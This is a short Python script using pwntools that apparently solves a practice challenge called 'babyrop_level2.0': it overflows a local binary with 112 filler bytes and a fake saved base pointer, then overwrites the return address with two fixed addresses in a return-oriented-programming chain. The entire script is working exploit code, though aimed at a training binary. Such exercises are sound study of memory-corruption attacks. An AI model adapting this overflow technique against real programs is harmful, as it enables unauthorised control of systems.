from pwn import *

payload = b""
payload += b"A" * 112
payload += b"B" * 8 # pop rbp
payload += p64(0x402108) # pop rsp; rip <- rsp
payload += p64(0x4021b5) # pop rsp; rip <- rsp

p = process("/challenge/babyrop_level2.0")

p.sendline(payload)

print(p.recvall())
